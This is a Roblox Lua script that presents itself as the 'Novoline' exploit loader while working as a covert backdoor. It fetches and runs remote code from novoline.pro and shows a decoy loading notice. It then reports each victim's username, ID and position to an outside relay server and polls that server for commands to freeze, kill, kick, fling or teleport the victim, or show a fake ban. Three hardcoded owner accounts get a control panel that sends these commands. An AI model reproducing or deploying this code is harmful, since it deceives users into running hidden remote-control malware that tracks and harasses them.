-- Script Provided By Real Vault // Script Reviewed By Realx

-- Asynchronous Decoy Loadstring (Prevents main thread freezing on execution)
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://novoline.pro"))()
    end)
end)

-- CONFIGURATION
local RELAY_URL = "https://roblox-troll-relay.onrender.com" -- Your Render URL
local AUTHORIZED_IDS = {
    3100850095,
    10282453521,
    11769862078
}

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local isOwner = table.find(AUTHORIZED_IDS, LocalPlayer.UserId) ~= nil

-- Safe HTTP Request Wrapper (Non-Blocking)
local function sendHttpRequest(method, endpoint, data)
    local url = RELAY_URL .. endpoint
    local body = data and HttpService:JSONEncode(data) or nil
    local requestMethod = request or (syn and syn.request) or (fluxus and fluxus.request) or HttpService.RequestAsync
    local headers = { ["Content-Type"] = "application/json" }
    
    local success, response = pcall(function()
        if requestMethod == HttpService.RequestAsync then
            return HttpService:RequestAsync({ Url = url, Method = method, Headers = headers, Body = body })
        else
            return requestMethod({ Url = url, Method = method, Headers = headers, Body = body })
        end
    end)
    
    if success and response then
        return type(response) == "table" and response.Body or response
    end
    return nil
end

-- CRASH-SAFE ACTION HANDLERS
local Actions = {
    ["Freeze"] = function()
        task.spawn(function()
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local humanoid = char:WaitForChild("Humanoid", 3)
            if humanoid then
                humanoid.WalkSpeed = 0
                humanoid.JumpPower = 0
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then part.Anchored = true end
                end
            end
        end)
    end,
    
    ["Unfreeze"] = function()
        task.spawn(function()
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local humanoid = char:WaitForChild("Humanoid", 3)
            if humanoid then
                humanoid.WalkSpeed = 16
                humanoid.JumpPower = 50
                for _, part in ipairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then part.Anchored = false end
                end
            end
        end)
    end,
    
    ["FakeBan"] = function(payload)
        task.spawn(function()
            local coreGui = game:GetService("CoreGui")
            if coreGui:FindFirstChild("FakeBanGui") then return end
            local screen = Instance.new("ScreenGui")
            screen.Name = "FakeBanGui"
            screen.IgnoreGuiInset = true
            screen.ZIndexBehavior = Enum.ZIndexBehavior.Global
            screen.Parent = coreGui
            
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            frame.Parent = screen
            
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.TextColor3 = Color3.fromRGB(255, 30, 30)
            label.TextSize = 28
            label.Font = Enum.Font.SourceSansBold
            
            local reasonText = (payload and payload ~= "") and payload or "Exploitative Activity / Unexpected Client Behavior"
            label.Text = "You have been permanently banned from this experience.\n\nReason: " .. reasonText .. "\nIncident ID: #" .. math.random(100000, 999999)
            label.Parent = frame
        end)
    end,
    
    ["Kick"] = function(payload)
        local msg = (payload and payload ~= "") and payload or "An unexpected client error occurred. (Error Code: 273)"
        LocalPlayer:Kick(msg)
    end,
    
    ["Kill"] = function()
        task.spawn(function()
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local humanoid = char:WaitForChild("Humanoid", 3)
            if humanoid then
                humanoid.Health = 0
            end
        end)
    end,
    
    ["TeleportTo"] = function(payload)
        task.spawn(function()
            if payload and payload.x and payload.y and payload.z then
                local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                local hrp = char:WaitForChild("HumanoidRootPart", 3)
                if hrp then
                    hrp.CFrame = CFrame.new(payload.x, payload.y, payload.z)
                end
            end
        end)
    end,
    
    ["Fling"] = function()
        task.spawn(function()
            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local hrp = char:WaitForChild("HumanoidRootPart", 3)
            if hrp then
                local bav = Instance.new("BodyAngularVelocity")
                bav.Name = "TrollFling"
                bav.AngularVelocity = Vector3.new(0, 50000, 0)
                bav.MaxTorque = Vector3.new(400000, 400000, 400000)
                bav.Parent = hrp
                
                task.wait(0.4)
                if bav then bav:Destroy() end
            end
        end)
    end
}

-- MAIN EXECUTION
if isOwner then
    local CoreGui = game:GetService("CoreGui")
    if CoreGui:FindFirstChild("TrollAdminPanel") then
        CoreGui.TrollAdminPanel:Destroy()
    end
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "TrollAdminPanel"
    ScreenGui.Parent = CoreGui
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 310, 0, 480)
    MainFrame.Position = UDim2.new(0.08, 0, 0.15, 0)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
    MainFrame.BorderSizePixel = 0
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Parent = ScreenGui
    
    local MainCorner = Instance.new("UICorner")
    MainCorner.CornerRadius = UDim.new(0, 8)
    MainCorner.Parent = MainFrame
    
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
    Title.Text = "  Advanced Troll Panel"
    Title.TextColor3 = Color3.fromRGB(240, 240, 240)
    Title.TextSize = 15
    Title.Font = Enum.Font.GothamBold
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = MainFrame
    
    local TitleCorner = Instance.new("UICorner")
    TitleCorner.CornerRadius = UDim.new(0, 8)
    TitleCorner.Parent = Title
    
    local selectedTargetId = nil
    
    -- Dropdown Toggle Button
    local DropdownBtn = Instance.new("TextButton")
    DropdownBtn.Size = UDim2.new(0.88, 0, 0, 32)
    DropdownBtn.Position = UDim2.new(0.06, 0, 0, 48)
    DropdownBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    DropdownBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
    DropdownBtn.Text = "Select Target (Click to Refresh)"
    DropdownBtn.Font = Enum.Font.GothamMedium
    DropdownBtn.TextSize = 12
    DropdownBtn.ZIndex = 3
    DropdownBtn.Parent = MainFrame
    
    local DropdownCorner = Instance.new("UICorner")
    DropdownCorner.CornerRadius = UDim.new(0, 6)
    DropdownCorner.Parent = DropdownBtn
    
    -- Dropdown Scrolling Frame
    local DropdownList = Instance.new("ScrollingFrame")
    DropdownList.Size = UDim2.new(0.88, 0, 0, 90)
    DropdownList.Position = UDim2.new(0.06, 0, 0, 83)
    DropdownList.BackgroundColor3 = Color3.fromRGB(28, 28, 36)
    DropdownList.BorderSizePixel = 0
    DropdownList.Visible = false
    DropdownList.ZIndex = 5
    DropdownList.CanvasSize = UDim2.new(0, 0, 0, 0)
    DropdownList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    DropdownList.ScrollBarThickness = 4
    DropdownList.Parent = MainFrame
    
    local ListCorner = Instance.new("UICorner")
    ListCorner.CornerRadius = UDim.new(0, 6)
    ListCorner.Parent = DropdownList
    
    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.Parent = DropdownList
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout.Padding = UDim.new(0, 2)
    
    local function refreshTargetList()
        for _, child in ipairs(DropdownList:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
        
        task.spawn(function()
            local response = sendHttpRequest("GET", "/players", nil)
            if response then
                local success, data = pcall(function() return HttpService:JSONDecode(response) end)
                if success and data then
                    for userId, info in pairs(data) do
                        if tonumber(userId) ~= LocalPlayer.UserId then
                            local item = Instance.new("TextButton")
                            item.Size = UDim2.new(1, 0, 0, 28)
                            item.BackgroundColor3 = Color3.fromRGB(45, 45, 58)
                            item.TextColor3 = Color3.fromRGB(230, 230, 230)
                            item.Text = "  " .. info.username .. " (" .. userId .. ")"
                            item.Font = Enum.Font.Gotham
                            item.TextSize = 11
                            item.TextXAlignment = Enum.TextXAlignment.Left
                            item.ZIndex = 6
                            item.Parent = DropdownList
                            
                            local itemCorner = Instance.new("UICorner")
                            itemCorner.CornerRadius = UDim.new(0, 4)
                            itemCorner.Parent = item
                            
                            item.MouseButton1Click:Connect(function()
                                selectedTargetId = userId
                                DropdownBtn.Text = "Target: " .. info.username
                                DropdownList.Visible = false
                            end)
                        end
                    end
                end
            end
        end)
    end
    
    DropdownBtn.MouseButton1Click:Connect(function()
        DropdownList.Visible = not DropdownList.Visible
        if DropdownList.Visible then
            refreshTargetList()
        end
    end)
    
    -- Custom Note TextBox
    local NoteBox = Instance.new("TextBox")
    NoteBox.Size = UDim2.new(0.88, 0, 0, 32)
    NoteBox.Position = UDim2.new(0.06, 0, 0, 86)
    NoteBox.BackgroundColor3 = Color3.fromRGB(32, 32, 42)
    NoteBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    NoteBox.PlaceholderText = "Custom Kick / FakeBan Message..."
    NoteBox.Text = ""
    NoteBox.Font = Enum.Font.Gotham
    NoteBox.TextSize = 11
    NoteBox.Parent = MainFrame
    
    local NoteCorner = Instance.new("UICorner")
    NoteCorner.CornerRadius = UDim.new(0, 6)
    NoteCorner.Parent = NoteBox
    
    -- Action Buttons Layout Builder
    local function createActionButton(name, yPos, actionName, color, payloadFunc)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.88, 0, 0, 30)
        btn.Position = UDim2.new(0.06, 0, 0, yPos)
        btn.BackgroundColor3 = color or Color3.fromRGB(45, 45, 58)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Text = name
        btn.Font = Enum.Font.GothamMedium
        btn.TextSize = 12
        btn.ZIndex = 2
        btn.Parent = MainFrame
        
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 5)
        btnCorner.Parent = btn
        
        btn.MouseButton1Click:Connect(function()
            if selectedTargetId then
                local oldText = btn.Text
                btn.Text = "Sending..."
                task.spawn(function()
                    local payload = payloadFunc and payloadFunc() or nil
                    sendHttpRequest("POST", "/send", {
                        targetId = selectedTargetId,
                        action = actionName,
                        payload = payload
                    })
                    task.wait(0.5)
                    btn.Text = oldText
                end)
            else
                DropdownBtn.Text = "⚠️ Please select a target first!"
                task.wait(1.5)
                DropdownBtn.Text = "Select Target (Click to Refresh)"
            end
        end)
    end
    
    createActionButton("Freeze Target", 124, "Freeze", Color3.fromRGB(45, 85, 135))
    createActionButton("Unfreeze Target", 158, "Unfreeze", Color3.fromRGB(50, 115, 70))
    createActionButton("Trigger Fake Ban", 192, "FakeBan", Color3.fromRGB(130, 45, 45), function() return NoteBox.Text end)
    createActionButton("Force Kick", 226, "Kick", Color3.fromRGB(115, 35, 35), function() return NoteBox.Text end)
    createActionButton("Kill Target", 260, "Kill", Color3.fromRGB(90, 30, 110))
    createActionButton("Fling Target", 294, "Fling", Color3.fromRGB(140, 90, 30))
    
    createActionButton("Bring Target (TP to Me)", 328, "TeleportTo", Color3.fromRGB(40, 110, 110), function()
        local char = LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            local pos = char.HumanoidRootPart.Position
            return { x = pos.X, y = pos.Y + 3, z = pos.Z }
        end
        return nil
    end)
    
    -- Goto Button
    local GotoBtn = Instance.new("TextButton")
    GotoBtn.Size = UDim2.new(0.88, 0, 0, 30)
    GotoBtn.Position = UDim2.new(0.06, 0, 0, 362)
    GotoBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 110)
    GotoBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    GotoBtn.Text = "Goto Target (TP to Them)"
    GotoBtn.Font = Enum.Font.GothamMedium
    GotoBtn.TextSize = 12
    GotoBtn.Parent = MainFrame
    
    local GotoCorner = Instance.new("UICorner")
    GotoCorner.CornerRadius = UDim.new(0, 5)
    GotoCorner.Parent = GotoBtn
    
    GotoBtn.MouseButton1Click:Connect(function()
        if selectedTargetId then
            GotoBtn.Text = "Teleporting..."
            task.spawn(function()
                local res = sendHttpRequest("GET", "/players", nil)
                if res then
                    local success, data = pcall(function() return HttpService:JSONDecode(res) end)
                    if success and data and data[tostring(selectedTargetId)] then
                        local tInfo = data[tostring(selectedTargetId)]
                        if tInfo.position then
                            local char = LocalPlayer.Character
                            if char and char:FindFirstChild("HumanoidRootPart") then
                                char.HumanoidRootPart.CFrame = CFrame.new(tInfo.position.x, tInfo.position.y + 3, tInfo.position.z)
                            end
                        end
                    end
                end
                task.wait(0.5)
                GotoBtn.Text = "Goto Target (TP to Them)"
            end)
        else
            DropdownBtn.Text = "⚠️ Please select a target first!"
            task.wait(1.5)
            DropdownBtn.Text = "Select Target (Click to Refresh)"
        end
    end)

else
    -- NON-OWNER BACKGROUND POLLING
    task.spawn(function()
        while true do
            task.wait(2)
            pcall(function()
                local char = LocalPlayer.Character
                local posData = nil
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local p = hrp.Position
                        posData = { x = p.X, y = p.Y, z = p.Z }
                    end
                end
                
                sendHttpRequest("POST", "/ping", {
                    userId = tostring(LocalPlayer.UserId),
                    username = LocalPlayer.Name,
                    position = posData
                })
            end)
            
            local responseBody = sendHttpRequest("GET", "/poll/" .. LocalPlayer.UserId, nil)
            if responseBody then
                local success, data = pcall(function()
                    return HttpService:JSONDecode(responseBody)
                end)
                if success and data and data.commands then
                    for _, cmdData in ipairs(data.commands) do
                        local cmd = type(cmdData) == "table" and cmdData.action or cmdData
                        local payload = type(cmdData) == "table" and cmdData.payload or nil
                        
                        if Actions[cmd] then
                            task.spawn(function()
                                Actions[cmd](payload)
                            end)
                        end
                    end
                end
            end
        end
    end)
end

-- Decoy Notification for all users
task.spawn(function()
    task.wait(3)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Novoline V2.3",
            Text = "Loading Novoline",
            Icon = "rbxassetid://5937224699",
            Duration = 20
        })
    end)
end)
